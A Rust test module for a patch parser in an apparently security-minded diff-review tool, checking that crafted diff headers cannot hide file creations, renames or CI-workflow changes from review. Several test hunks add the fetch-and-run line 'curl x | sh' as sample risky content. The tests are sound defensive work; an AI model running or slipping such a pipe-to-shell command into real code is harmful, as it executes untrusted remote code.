    /// (Expert circle, 2026-10-28: content addresses must not move when other files change, and
    /// must not survive a change to the hunk itself.)
    #[test]
    fn hunk_addresses_and_body_digests() {
        let one = "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@ fn f()\n a\n-b\n+c\n";
        let other = "--- a/y\n+++ b/y\n@@ -1 +1 @@\n-p\n+q\n";
        let hunk = |patch: &str, file: usize| {
            let files = parse(patch).unwrap();
            let h = files[file].patch_twin.hunks[0].clone();
            (h.address(&files[file].path), h.body_sha256(), h)
        };
        let (address, body, h) = hunk(one, 0);
        assert_eq!(h.section.as_deref(), Some("fn f()"));
        assert_eq!(h.counts(), (2, 2));
        assert_eq!(address.len(), 64);
        // Another file before it changes neither.
        let (a2, b2, _) = hunk(&format!("{other}{one}"), 1);
        assert_eq!((a2, b2), (address.clone(), body.clone()));
        // The same body at another position keeps its digest but not its address.
        let (a3, b3, _) = hunk(&one.replace("@@ -1,2 +1,2 @@", "@@ -9,2 +9,2 @@"), 0);
        assert_eq!(b3, body);
        assert_ne!(a3, address);
        // One byte of the body changes both.
        let (a4, b4, _) = hunk(&one.replace("+c", "+d"), 0);
        assert_ne!((a4, b4), (address.clone(), body.clone()));
        // Another path changes the address only.
        let (a5, b5, _) = hunk(&one.replace("/x", "/z"), 0);
        assert_eq!(b5, body);
        assert_ne!(a5, address);
        // The heading is display only: it changes neither, and is never rendered.
        let (a6, b6, h6) = hunk(&one.replace(" fn f()", ""), 0);
        assert_eq!((a6, b6, h6.section), (address, body, None));
        assert!(!crate::render_unified(&parse(one).unwrap()).contains("fn f()"));
        // The no-newline marker is part of the body.
        let (_, b7, _) = hunk(&format!("{one}\\ No newline at end of file\n"), 0);
        assert_ne!(b7, hunk(one, 0).1);
    }

    /// A line after a file's hunk that git ignores is refused, not taken as a header: before,
    /// each of these changed the reviewed status, path or mode, or made a phantom file, while
    /// `git apply` applied a plain modification of `x` (bug hunt 2026-10-28, H1-01).
    #[test]
    fn headers_after_a_hunk_are_refused() {
        let head = "diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n";
        for trailing in [
            "new file mode 100644\n",
            "deleted file mode 100644\n",
            "rename to evil\n",
            "old mode 100644\nnew mode 100755\n",
            "+++ b/z\n",
            "--- /dev/null\n",
            "index 1111111..2222222 100644\n",
        ] {
            let err = parse(&format!("{head}{trailing}")).unwrap_err();
            assert!(
                matches!(err, PatchParseError::MisplacedHeader { .. }),
                "{trailing:?}: {err:?}"
            );
        }
        // A next file's own `---`/`+++` pair, or `diff --git`, still starts a file.
        assert_eq!(
            parse(&format!("{head}--- a/y\n+++ b/y\n@@ -1 +1 @@\n-c\n+d\n"))
                .unwrap()
                .len(),
            2
        );
        assert_eq!(parse(&format!("{head}{head}")).unwrap().len(), 2);
    }

    /// Each contradiction `flush_file` checks is refused on its own, as `InconsistentHeader`,
    /// not by a later check that happens to catch the same input.
    #[test]
    fn each_contradictory_header_is_refused_on_its_own() {
        let git = "diff --git a/x b/x\n";
        for (case, body) in [
            (
                "new and deleted",
                "new file mode 100644\ndeleted file mode 100644\n",
            ),
            (
                "new and renamed",
                "new file mode 100644\nrename from x\nrename to y\n",
            ),
            (
                "deleted and copied",
                "deleted file mode 100644\ncopy from x\ncopy to y\n",
            ),
            (
                "new with an old line",
                "new file mode 100644\n--- /dev/null\n+++ b/x\n@@ -1 +1,2 @@\n+a\n b\n",
            ),
            (
                "deleted with a new line",
                "deleted file mode 100644\n--- a/x\n+++ /dev/null\n@@ -1,2 +1 @@\n-a\n b\n",
            ),
            (
                "deleted from /dev/null",
                "deleted file mode 100644\n--- /dev/null\n+++ /dev/null\n@@ -1 +0,0 @@\n-a\n",
            ),
            (
                "new and binary with a hunk",
                "new file mode 100644\nBinary files /dev/null and b/x differ\n--- /dev/null\n+++ b/x\n@@ -0,0 +1 @@\n+a\n",
            ),
        ] {
            let err = parse(&format!("{git}{body}")).unwrap_err();
            assert!(
                matches!(err, PatchParseError::InconsistentHeader { .. }),
                "{case}: {err:?}"
            );
        }
        // Text hunks beside binary markers on an ordinary file are an unsupported format.
        let err = parse(&format!(
            "{git}Binary files a/x and b/x differ\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n"
        ))
        .unwrap_err();
        assert!(
            matches!(err, PatchParseError::UnsupportedFormat { .. }),
            "{err:?}"
        );
    }

    /// `git format-patch` output parses (bug hunt 2026-10-28, H1-07): the bare `---` before the
    /// diffstat and the `-- ` signature are mail framing git ignores outside a hunk. Only those
    /// exact lines are exempt, and a `---` still needs its `+++` once a file awaits one.
    #[test]
    fn format_patch_mail_framing_is_not_a_body_line() {
        let series = include_str!("../../../fixtures/patch/format-patch/series.patch");
        let files = parse(series).unwrap();
        assert_eq!(files.len(), 2);
        assert!(files.iter().all(|f| f.path == "f.txt"));
        assert_eq!(files[1].patch_twin.hunks[0].lines.len(), 3);
        let one = "Subject: x\n\n---\n f | 1 +\n\ndiff --git a/f b/f\n--- a/f\n+++ b/f\n@@ -1 +1 @@\n-a\n+b\n-- \n2.56.0\n";
        assert_eq!(parse(one).unwrap().len(), 1);
        for stray in ["----\n", "-- x\n", "--\n", "+++\n"] {
            let err =
                parse(&format!("--- a/f\n+++ b/f\n@@ -1 +1 @@\n-a\n+b\n{stray}")).unwrap_err();
            assert!(
                matches!(err, PatchParseError::BodyLineOutsideHunk { .. }),
                "{stray:?}: {err:?}"
            );
        }
        assert!(matches!(
            parse("--- a/f\n---\n").unwrap_err(),
            PatchParseError::MisplacedHeader { line_number: 2 }
        ));
    }

    /// Input git refuses as corrupt is refused here too (bug hunt 2026-10-28, H1-04).
    #[test]
    fn input_git_refuses_is_refused() {
        let refused = |input: &str| parse(input).unwrap_err();
        assert!(matches!(
            refused("--- a/x\n+++ b/x\n@@ -+1,+1 +1 @@\n-a\n+b\n"),
            PatchParseError::MalformedHunkHeader { .. }
        ));
        assert!(matches!(
            refused("--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b"),
            PatchParseError::UnterminatedLine { line_number: 5 }
        ));
        assert!(matches!(
            refused(
                "diff --git a/x b/x\nnew file mode 100644\n--- a/x\n+++ b/x\n@@ -0,0 +1 @@\n+b\n"
            ),
            PatchParseError::InconsistentHeader { .. }
        ));
        assert!(matches!(
            refused(
                "diff --git a/x b/x\ndeleted file mode 100644\n--- a/x\n+++ b/x\n@@ -1 +0,0 @@\n-a\n"
            ),
            PatchParseError::InconsistentHeader { .. }
        ));
        assert!(matches!(
            refused("--- a/x\n+++ b/x\n+++ b/y\n@@ -1 +1 @@\n-a\n+b\n"),
            PatchParseError::MisplacedHeader { line_number: 3 }
        ));
        assert!(matches!(
            refused("--- a/x\n@@ -1 +1 @@\n-a\n+b\n"),
            PatchParseError::MisplacedHeader { line_number: 2 }
        ));
        assert_eq!(parse_range("1,2,3"), None);
        // A final context or EOF-marker line, and preamble without a line feed, are fine.
        assert!(
            parse("--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n\\ No newline at end of file\n").is_ok()
        );
        assert!(parse("--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\ntrailing note").is_ok());
    }

    #[test]
    fn byte_budget_is_enforced() {
        let options = ParseOptions { byte_budget: 8 };
        let err = parse_with("diff --git a/x b/x\n", options).unwrap_err();
        assert!(matches!(err, PatchParseError::BudgetExceeded { .. }));
    }

    #[test]
    fn structural_line_budget_is_enforced_before_model_amplification() {
        let input = "preamble\n".repeat(DEFAULT_LINE_BUDGET + 1);
        let options = ParseOptions {
            byte_budget: input.len(),
        };
        let err = parse_with(&input, options).unwrap_err();
        assert!(matches!(
            err,
            PatchParseError::LineBudgetExceeded {
                limit_lines: DEFAULT_LINE_BUDGET,
                actual_lines
            } if actual_lines == DEFAULT_LINE_BUDGET + 1
        ));
    }

    #[test]
    fn budget_error_reports_sizes() {
        let options = ParseOptions { byte_budget: 4 };
        match parse_with("abcdefgh", options).unwrap_err() {
            PatchParseError::BudgetExceeded {
                limit_bytes,
                actual_bytes,
            } => {
                assert_eq!(limit_bytes, 4);
                assert_eq!(actual_bytes, 8);
            }
            other => panic!("unexpected error: {other:?}"),
        }
    }

    #[test]
    fn preamble_lines_before_first_file_are_ignored() {
        let input = "\
From abc Mon Sep 17 00:00:00 2001
Subject: [PATCH] do a thing

 This is an indented commit message line.
diff --git a/x b/x
--- a/x
+++ b/x
@@ -1,1 +1,1 @@
-a
+b
";
        let files = parse(input).unwrap();
        assert_eq!(files.len(), 1);
        assert_eq!(files[0].path, "x");
    }

    #[test]
    fn hunk_without_explicit_count_defaults_to_one() {
        let input = "\
--- a/x
+++ b/x
@@ -1 +1 @@
-a
+b
";
        let file = one(input);
        assert_eq!(file.patch_twin.hunks[0].lines.len(), 2);
    }

    #[test]
    fn context_only_blank_line_is_empty_text() {
        let input = "\
--- a/x
+++ b/x
@@ -1,3 +1,3 @@
 a

-b
+B
";
        let file = one(input);
        let blank = &file.patch_twin.hunks[0].lines[1];
        assert_eq!(blank.kind, PatchLineKind::Context);
        assert_eq!(blank.text, "");
    }

    #[test]
    fn parse_with_large_budget_accepts_normal_input() {
        let files = parse_with(BASIC, ParseOptions::default()).unwrap();
        assert_eq!(files.len(), 1);
    }

    #[test]
    fn p_name_removes_the_first_component_and_squashes_slashes() {
        assert_eq!(p_name("a/src/x.rs", false), "src/x.rs");
        assert_eq!(p_name("b/src/x.rs", false), "src/x.rs");
        assert_eq!(p_name("w/src/x.rs", false), "src/x.rs");
        assert_eq!(p_name("vendor/build.rs", false), "build.rs");
        assert_eq!(p_name("/abs/x", false), "abs/x");
        assert_eq!(p_name("plain", false), "plain");
        assert_eq!(
            p_name("a/.github//workflows///ci.yml", false),
            ".github/workflows/ci.yml"
        );
        assert_eq!(p_name("a/x", true), "a/x");
        assert_eq!(strip_p("a/", false), None);
        assert_eq!(strip_p("x", false), None);
        assert_eq!(strip_p("x", true), Some("x"));
        assert_eq!(strip_p("", true), None);
    }

    /// The reviewed path is the one `git apply` (default `-p1`) writes, whatever the first
    /// component is. Only `a/` and `b/` were stripped: `--- vendor/build.rs` was reviewed as
    /// vendored code while Git wrote the top-level `build.rs`, and a `diff.mnemonicPrefix` diff
    /// was reviewed as `w/build.rs` (bug hunt 2026-11-01).
    #[test]
    fn header_paths_lose_their_first_component_as_git_apply_strips_it() {
        let hunk = "@@ -1 +1 @@\n-a\n+b\n";
        for (headers, path) in [
            ("--- vendor/build.rs\n+++ vendor/build.rs\n", "build.rs"),
            ("--- orig/src/x.c\n+++ new/src/x.c\n", "src/x.c"),
            (
                "diff --git i/build.rs w/build.rs\n--- i/build.rs\n+++ w/build.rs\n",
                "build.rs",
            ),
            ("--- build.rs\n+++ build.rs\n", "build.rs"),
            ("--- a/x\n+++ b/x\n", "x"),
        ] {
            assert_eq!(one(&format!("{headers}{hunk}")).path, path, "{headers}");
        }
        // Without `---`/`+++`, the `diff --git` names are split as Git splits them: where both
        // halves name the same path, so a name with a space survives.
        for (line, path) in [
            ("diff --git i/x w/x", "x"),
            ("diff --git c/a b w/a b", "a b"),
            ("diff --git a/x b/x", "x"),
        ] {
            let file = one(&format!("{line}\nold mode 100644\nnew mode 100755\n"));
            assert_eq!(
                (file.path.as_str(), file.status),
                (path, FileStatus::ModeChanged),
                "{line}"
            );
        }
        assert_eq!(same_name_halves("i/x w/y", false), None);
        assert_eq!(same_name_halves("i/x\tw/x", false).as_deref(), Some("x"));
        assert_eq!(same_name_halves("nothing", false), None);
        assert_eq!(same_name_halves("a/x /x", false), None);
        assert_eq!(same_name_halves("a/x ", false), None);
        assert_eq!(same_name_halves("/x /x", false), None);
        assert_eq!(same_name_halves("x x", true).as_deref(), Some("x"));
        assert_eq!(same_name_halves("a/x b/x", true), None);
        assert_eq!(same_name_halves("/x /x", true), None);
        // A quoted second half decodes to the first name, followed by whitespace in the line.
        assert_eq!(same_name_halves("i/x \"w/x\"", false).as_deref(), Some("x"));
        assert_eq!(same_name_halves("i/x \"w/y\"", false), None);
        assert_eq!(same_name_halves("i/x\"w/x\"", false), None);
        assert_eq!(same_name_halves("i/x \"/x\"", false), None);
        assert_eq!(same_name_halves("i/x \"w/x", false), None);
        // The `/` after a separator is found once: later separators before it reuse it.
        assert_eq!(
            same_name_halves("i/a b c w/a b c", false).as_deref(),
            Some("a b c")
        );
        assert_eq!(
            same_name_halves("i/a w/b w/a w/b", false).as_deref(),
            Some("a w/b")
        );
        assert_eq!(same_name_halves("i/a /a", false), None);
        assert_eq!(same_name_halves("a b", true), None);
        // A megabyte of separators is one pass (a scan per separator, 10^12 steps, never ends).
        let spaces = format!("a/{}x", " ".repeat(1 << 20));
        assert_eq!(same_name_halves(&spaces, false), None);
        assert_eq!(same_name_halves(&spaces, true), None);
    }

    /// `diff --git` is split as `git_header_name` splits it, before the ` b/` heuristic: with
    /// that first, `a/x b/y b/x b/y` was reviewed as `y` and the mnemonic `i/a b/c w/a b/c` as
    /// `c`, while Git changed `x b/y` and `a b/c` (bug hunt 2026-11-01).
    #[test]
    fn diff_git_halves_naming_one_path_win_over_the_b_heuristic() {
        for (line, path) in [
            ("diff --git a/x b/y b/x b/y", "x b/y"),
            ("diff --git i/a b/c w/a b/c", "a b/c"),
            ("diff --git i/x \"w/x\"", "x"),
            ("diff --git a/x \"b/x\"", "x"),
            // Different names, as `git diff --no-index` writes them for two files: the
            // rightmost ` b/` still splits them (Git takes no name from the line).
            ("diff --git a/x b/y", "y"),
            // A CR ending the line is not part of the first name, so the halves never match.
            ("diff --git a/x b/x\r", "x\r"),
        ] {
            let file = one(&format!("{line}\nold mode 100644\nnew mode 100755\n"));
            assert_eq!(
                (file.path.as_str(), file.status),
                (path, FileStatus::ModeChanged),
                "{line}"
            );
        }
    }

    /// A section Git can name no path for ("git diff header lacks filename information") is
    /// refused at its first line: a mode change under `diff --git i/x w/y`, or a CRLF `i/x w/x`,
    /// was reviewed as a file with an empty path (bug hunt 2026-11-01).
    #[test]
    fn a_section_that_names_no_path_is_refused() {
        for patch in [
            "diff --git i/x w/y\nold mode 100644\nnew mode 100755\n",
            "diff --git i/x w/x\r\nold mode 100644\r\nnew mode 100755\r\n",
            "diff --git a/x /x\nold mode 100644\nnew mode 100755\n",
            "diff --git x\n",
        ] {
            assert_eq!(
                parse(patch),
                Err(PatchParseError::InvalidPath { line_number: 1 }),
                "{patch:?}"
            );
        }
        assert_eq!(
            parse("--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\ndiff --git i/x w/y\nnew mode 100755\n"),
            Err(PatchParseError::InvalidPath { line_number: 6 })
        );
        // A hunk with no file headers at all (Git: "patch fragment without header").
        assert_eq!(
            parse("commit message\n@@ -1 +1 @@\n-a\n+b\n"),
            Err(PatchParseError::InvalidPath { line_number: 2 })
        );
        // A traditional section whose names are empty after their first component (Git:
        // "unable to find filename") is refused at its `---`.
        assert_eq!(
            parse("--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n--- a/\n+++ b/\n@@ -1 +1 @@\n-a\n+b\n"),
            Err(PatchParseError::InvalidPath { line_number: 6 })
        );
        // The `---`/`+++` paths name the file whatever the line holds.
        assert_eq!(
            one("diff --git i/x w/y\n--- i/x\n+++ w/x\n@@ -1 +1 @@\n-a\n+b\n").path,
            "x"
        );
    }

    /// A header path is the one `git apply` chooses: slashes squashed, in a traditional diff
    /// the old name when it is a strict prefix of an unquoted new one, a `diff -u` date after
    /// spaces dropped, a CR ending an unquoted name, and `/dev/null` followed by whitespace a
    /// creation. Each was reviewed under another path or status, losing `ci_privilege`,
    /// `build_hook` or `new_file` (bug hunt 2026-11-01).
    #[test]
    fn traditional_headers_name_the_file_git_apply_writes() {
        let hunk = "@@ -1 +1 @@\n-a\n+b\n";
        let new = "@@ -0,0 +1 @@\n+curl x | sh\n";
        for (patch, path, status) in [
            (
                format!("--- a/.github//workflows/ci.yml\n+++ b/.github//workflows/ci.yml\n{hunk}"),
                ".github/workflows/ci.yml",
                FileStatus::Modified,
            ),
            (
                format!("diff --git a/d//x b/d//x\n--- a/d//x\n+++ b/d//x\n{hunk}"),
                "d/x",
                FileStatus::Modified,
            ),
            (
                format!("--- a/build.rs\n+++ b/build.rs.new\n{hunk}"),
                "build.rs",
                FileStatus::Modified,
            ),
            (
                format!("--- \"a/build.rs\"\n+++ b/build.rs.new\n{hunk}"),
                "build.rs",
                FileStatus::Modified,
            ),
            // A quoted new name is taken whole, as Git takes it.
            (
                format!("--- a/build.rs\n+++ \"b/build.rs.new\"\n{hunk}"),
                "build.rs.new",
                FileStatus::Modified,
            ),
            (
                format!("--- a/build.rs.new\n+++ b/build.rs\n{hunk}"),
                "build.rs",
                FileStatus::Modified,
            ),
            // The prefix choice is a traditional diff's; a Git diff takes the `+++` name.
            (
                format!("diff --git a/build.rs b/build.rs.new\n--- a/build.rs\n+++ b/build.rs.new\n{hunk}"),
                "build.rs.new",
                FileStatus::Modified,
            ),
            (
                format!("--- a/build.rs 2026-01-01 12:00:00\n+++ b/build.rs 2026-01-01 12:00:00\n{hunk}"),
                "build.rs",
                FileStatus::Modified,
            ),
            (
                format!("--- a/x\ry\n+++ b/x\ry\n{hunk}"),
                "x",
                FileStatus::Modified,
            ),
            (
                format!("--- /dev/null x\n+++ b/n\n{new}"),
                "n",
                FileStatus::Added,
            ),
            (
                "diff --git a/x b/y\nsimilarity index 90%\nrename from x\nrename to .github//workflows/ci.yml\n"
                    .to_owned(),
                ".github/workflows/ci.yml",
                FileStatus::Renamed,
            ),
        ] {
            let file = one(&patch);
            assert_eq!((file.path.as_str(), file.status), (path, status), "{patch:?}");
        }
    }

    /// `has_epoch_timestamp`: in a traditional diff an epoch `---` creates the file and an epoch
    /// `+++` deletes the one the `+++` names; `--- a/new.sh<TAB>1970-01-01 …` was reviewed as
    /// `modified`, losing `new_file` (bug hunt 2026-11-01).
    #[test]
    fn an_epoch_timestamp_creates_or_deletes_a_traditional_file() {
        let new = "@@ -0,0 +1 @@\n+curl x | sh\n";
        let gone = "@@ -1 +0,0 @@\n-a\n";
        let epoch = "1970-01-01 00:00:00.000000000 +0000";
        let later = "2026-11-01 09:00:00.000000000 +0000";
        for (patch, path, status) in [
            (
                format!("--- a/new.sh\t{epoch}\n+++ b/new.sh\t{later}\n{new}"),
                "new.sh",
                FileStatus::Added,
            ),
            (
                format!("--- a/x\t{later}\n+++ b/y\t{epoch}\n{gone}"),
                "y",
                FileStatus::Deleted,
            ),
            (
                format!("--- a/x\t1969-12-31 19:00:00 -0500\n+++ b/x\t{later}\n{new}"),
                "x",
                FileStatus::Added,
            ),
            (
                format!("--- a/x\t1970-01-01 05:30:00 +05:30\n+++ b/x\n{new}"),
                "x",
                FileStatus::Added,
            ),
            // Not the epoch: a fraction, an hour off, no tab, a CRLF line, or a Git diff.
            (
                format!("--- a/x\t1970-01-01 00:00:00.5 +0000\n+++ b/x\n{new}"),
                "x",
                FileStatus::Modified,
            ),
            (
                format!("--- a/x\t1970-01-01 01:00:00 +0000\n+++ b/x\n{new}"),
                "x",
                FileStatus::Modified,
            ),
            (
                format!("--- a/x 1970-01-01 00:00:00 +0000\n+++ b/x\n{new}"),
                "x",
                FileStatus::Modified,
            ),
            (
                format!("--- a/x\t{epoch}\r\n+++ b/x\t{later}\r\n{new}"),
                "x",
                FileStatus::Modified,
            ),
            (
                format!("diff --git a/x b/x\n--- a/x\t{epoch}\n+++ b/x\n{new}"),
                "x",
                FileStatus::Modified,
            ),
        ] {
            let file = one(&patch);
            assert_eq!(
                (file.path.as_str(), file.status),
                (path, status),
                "{patch:?}"
            );
        }
    }

    /// `guess_p_value`: a traditional diff's slashless new name sets `-p0` for it and every
    /// later file, so after `--- x`, `--- .github/workflows/ci.yml` is that path, not
    /// `workflows/ci.yml` (bug hunt 2026-11-01).
    #[test]
    fn a_slashless_traditional_name_guesses_p0_for_the_rest_of_the_patch() {
        let hunk = "@@ -1 +1 @@\n-a\n+b\n";
        let new = "@@ -0,0 +1 @@\n+curl x | sh\n";
        let gone = "@@ -1 +0,0 @@\n-a\n";
        // `-p0`, guessed from `--- x`, holds for every later file, Git diffs included.
        let files = parse(&format!(
            "--- a/y\n+++ b/y\n{hunk}--- x\n+++ x\n{hunk}--- .github/workflows/ci.yml\n+++ .github/workflows/ci.yml\n{hunk}diff --git a/z b/z\n--- a/z\n+++ b/z\n{hunk}"
        ))
        .unwrap();
        let paths: Vec<_> = files.iter().map(|f| f.path.as_str()).collect();
        assert_eq!(paths, ["y", "x", ".github/workflows/ci.yml", "b/z"]);
        // A slashed new name guesses nothing, nor does `/dev/null`; a slashless one after them does.
        let files = parse(&format!(
            "--- x\n+++ b/x\n{hunk}--- a/y\n+++ /dev/null\n{gone}--- /dev/null\n+++ n\n{new}--- a/b/c\n+++ a/b/c\n{hunk}"
        ))
        .unwrap();
        let paths: Vec<_> = files.iter().map(|f| f.path.as_str()).collect();
        assert_eq!(paths, ["x", "y", "n", "a/b/c"]);
        // `/dev/null` on both sides creates `dev/null` in Git, the `+++` name stripped.
        assert_eq!(
            (one(&format!("--- /dev/null\n+++ /dev/null\n{new}"))
                .path
                .as_str()),
            "dev/null"
        );
        // Under `-p0` a Git diff's same-name split keeps the whole name.
        let files = parse(&format!(
            "--- x\n+++ x\n{hunk}diff --git y y\nold mode 100644\nnew mode 100755\n"
        ))
        .unwrap();
        assert_eq!(files[1].path, "y");
    }

    /// Git drops the carriage returns ending a header line, so a CRLF patch names the paths and
    /// the `/dev/null` sides Git applies. Kept, `--- /dev/null\r` made an added CI workflow a
    /// `modified` file under a path ending in CR, losing its new-file and CI signals (bug hunt
    /// 2026-11-01). Body lines keep their CR (content), and a quoted CR stays in the name.
    #[test]
    fn crlf_header_lines_name_the_paths_git_applies() {
        let added = one(
            "--- /dev/null\r\n+++ b/.github/workflows/ci.yml\r\n@@ -0,0 +1 @@\r\n+on: pull_request_target\r\n",
        );
        assert_eq!(
            (added.path.as_str(), added.status),
            (".github/workflows/ci.yml", FileStatus::Added)
        );
        assert_eq!(
            added.patch_twin.hunks[0].lines[0].text,
            "on: pull_request_target\r"
        );
        assert_eq!(added.patch_twin.hunks[0].section, None);
        let deleted = one("--- a/x\r\n+++ /dev/null\r\n@@ -1 +0,0 @@\r\n-a\r\n");
        assert_eq!(
            (deleted.path.as_str(), deleted.status),
            ("x", FileStatus::Deleted)
        );
        let git = one(
            "diff --git a/x b/x\r\nold mode 100644\r\nnew mode 100755\r\n--- a/x\r\n+++ b/x\r\n@@ -1 +1 @@\r\n-a\r\n+b\r\n",
        );
        assert_eq!(git.path, "x");
        assert_eq!(
            git.patch_twin.metadata,
            ["old mode 100644", "new mode 100755"]
        );
        let renamed =
            one("diff --git a/x b/y\r\nsimilarity index 90%\r\nrename from x\r\nrename to y\r\n");
        assert_eq!(
            (renamed.path.as_str(), renamed.status),
            ("y", FileStatus::Renamed)
        );
        let out = crate::render_unified(std::slice::from_ref(&renamed));
        assert!(
            out.contains("diff --git a/x b/y\nsimilarity index 90%\nrename from x\n"),
            "{out}"
        );
        // `format-patch`'s bare `---` framing line, CRLF-converted, is still framing.
        assert_eq!(
            one("Subject: x\r\n---\r\n--- a/x\r\n+++ b/x\r\n@@ -1 +1 @@\r\n-a\r\n+b\r\n").path,
            "x"
        );
        let quoted = one("--- \"a/x\\r\"\n+++ \"b/x\\r\"\n@@ -1 +1 @@\n-a\n+b\n");
        assert_eq!(quoted.path, "x\r");
    }

    /// `git apply` reads `rename old`/`rename new` as `rename from`/`rename to`; ignored, they let
    /// a rename be reviewed as `modified <new>` with no sign that the old path goes (bug hunt
    /// 2026-11-01). No current Git writes them, so they are refused rather than translated.
    #[test]
    fn rename_old_and_rename_new_are_refused() {
        for line in ["rename old x", "rename new y"] {
            assert_eq!(
                parse(&format!(
                    "diff --git a/x b/y\nsimilarity index 90%\n{line}\n--- a/x\n+++ b/y\n@@ -1 +1 @@\n-a\n+b\n"
                )),
                Err(PatchParseError::UnsupportedFormat { line_number: 3 }),
                "{line}"
            );
        }
        // After the file's headers Git does not read them as headers, and neither does DDF.
        assert!(parse("--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\nrename old x\n").is_ok());
    }

    #[test]
    fn header_name_drops_trailing_tab_timestamp() {
        for dated in [false, true] {
            assert_eq!(
                header_name("a/x.txt\t2026-06-21 12:00:00", dated).as_deref(),
                Some("a/x.txt")
            );
            assert_eq!(
                header_name("/dev/null", dated).as_deref(),
                Some("/dev/null")
            );
            assert_eq!(
                header_name("/dev/null\tx", dated).as_deref(),
                Some("/dev/null")
            );
            assert_eq!(
                header_name("/dev/nullx", dated).as_deref(),
                Some("/dev/nullx")
            );
            assert_eq!(header_name("a/x\ry", dated).as_deref(), Some("a/x"));
            assert_eq!(header_name("\"a/x\\ry\"", dated).as_deref(), Some("a/x\ry"));
            assert_eq!(header_name("a/\0", dated), None);
        }
        // Only a traditional diff's dated line drops a date after spaces, and keeps what comes
        // before the date whole.
        assert_eq!(
            header_name("a/x 2026-06-21 12:00:00", false).as_deref(),
            Some("a/x 2026-06-21 12:00:00")
        );
        assert_eq!(
            header_name("a/x  2026-06-21 12:00:00", true).as_deref(),
            Some("a/x")
        );
        assert_eq!(
            header_name("a/x\ty\t2026-06-21 12:00:00", true).as_deref(),
            Some("a/x\ty")
        );
        assert_eq!(
            header_name("a/x\ry\t2026-06-21 12:00:00", true).as_deref(),
            Some("a/x\ry")
        );
    }

    /// `diff_timestamp_len`'s forms: date, time, fraction and zone, with a tab or spaces before.
    #[test]
    fn timestamp_len_measures_the_trailing_diff_date() {
        let len = |s: &str| timestamp_len(s.as_bytes());
        assert_eq!(len("x\t2026-06-21 12:00:00"), 20);
        assert_eq!(len("x\t26-06-21 12:00:00"), 18);
        assert_eq!(len("x\t2026-06-21 12:00:00.620000023 -0500"), 36);
        assert_eq!(len("x\t2026-06-21 12:00:00 +05:30"), 27);
        assert_eq!(len("x\t2026-06-21 12:00:00.5 +0530"), 28);
        assert_eq!(len("x   2026-06-21 12:00:00"), 22);
        assert_eq!(len("x\t2026-06-21"), 11);
        assert_eq!(len("2026-06-21 12:00:00"), 0);
        assert_eq!(len("x2026-06-21 12:00:00"), 0);
        assert_eq!(len("x\t2026-06-21 12:00:00 x"), 0);
        assert_eq!(len("x\t2026/06/21 12:00:00"), 0);
        assert_eq!(len("x\t2026-06-21 12-00:00"), 0);
        assert_eq!(len("x\t2026-06-21 12:00:00.5"), 22);
        assert_eq!(len("x\t2026-06-21 12:00:00 +x500"), 0);
        assert_eq!(len("x\t2026-06-21 12:00:00 +05x30"), 0);
        assert_eq!(len("x\t2026-06-21 12:00:00 05:30"), 0);
        assert_eq!(len("x\t2026-06-21 12:00:00.x5"), 0);
        assert_eq!(len("x\t.5"), 0);
        assert_eq!(len("5"), 0);
        assert_eq!(len(""), 0);
    }

    /// `has_epoch_timestamp`: the stamp after the last tab is the epoch in its zone.
    #[test]
    fn epoch_timestamps_are_the_epoch_in_their_zone() {
        for stamp in [
            "1970-01-01 00:00:00 +0000",
            "1970-01-01 00:00:00.000 -0000",
            "1970-01-01 05:30:00 +0530",
            "1970-01-01 05:30:00 +05:30",
            "1969-12-31 19:00:00 -0500",
            "1969-12-31 23:59:00 -0001",
            "1970-01-01 00:00:00 +0000",
        ] {
            assert!(has_epoch_timestamp(&format!("a/x\tz\t{stamp}")), "{stamp}");
        }
        for stamp in [
            "1970-01-01 00:00:01 +0000",
            "1970-01-01 00:00:00.5 +0000",
            "1970-01-01 00:00:00. +0000",
            "1970-01-01 01:00:00 +0000",
            "1970-01-01 00:00:00 -0500",
            "1969-12-31 19:00:00 +0500",
            "1971-01-01 00:00:00 +0000",
            "1970-01-01 00:00:00 +0000 ",
            "1970-01-01 00:00:00  +0000",
            "1970-01-01 00:00:00 0000",
            "1970-01-01 00:00:00 +000",
            "1970-01-01 00:00:00",
            "1970-01-01 30:00:00 +0000",
            "1970-01-01 00:60:00 +0000",
            "1970-01-01 0a:00:00 +0000",
            "1970-01-01 00:0a:00 +0000",
            "1970-01-01 00-00:00 +0000",
            "1970-01-01 00:00:00 +3000",
            "1970-01-01 00:00:00 +0060",
            "1970-01-01 00:00:00 +00:0",
            // Out of `[0-2][0-9]`/`[0-5][0-9]`, though the sums would make the epoch (measured:
            // Git applies these as changes, not creations).
            "1970-01-01 30:00:00 +3000",
            "1970-01-01 00:60:00 +0100",
            "1970-01-01 01:00:00 +0060",
            "1970-01-01 01:00:00 +00:60",
        ] {
            assert!(!has_epoch_timestamp(&format!("a/x\t{stamp}")), "{stamp}");
        }
        assert!(!has_epoch_timestamp("a/x 1970-01-01 00:00:00 +0000"));
    }

    #[test]
    fn parse_range_defaults_count() {
        assert_eq!(parse_range("5"), Some((5, 1)));
        assert_eq!(parse_range("5,3"), Some((5, 3)));
        assert_eq!(parse_range("x"), None);
    }

    // --- hunk-header closing `@@` enforcement (patch truth) ---
    //
    // A valid unified hunk header is: `@@ -old[,count] +new[,count] @@ [section]`
    // The closing `@@` is mandatory. All REJECT tests below would have been
    // accepted (parse returning Ok with a hunk) before the fix that enforces the
    // closer; they now produce `MalformedHunkHeader`.

    /// Basic header with explicit counts — must parse successfully end-to-end.
    #[test]
    fn hunk_header_accepts_basic_with_counts() {
        let input = "--- a/x\n+++ b/x\n@@ -1,1 +1,1 @@\n-old\n+new\n";
        let file = one(input);
        assert_eq!(file.patch_twin.hunks.len(), 1);
    }

    /// Header where both counts default to 1 (omitted) — must parse successfully.
    #[test]
    fn hunk_header_accepts_default_counts() {
        let input = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n-old\n+new\n";
        let file = one(input);
        assert_eq!(file.patch_twin.hunks.len(), 1);
    }

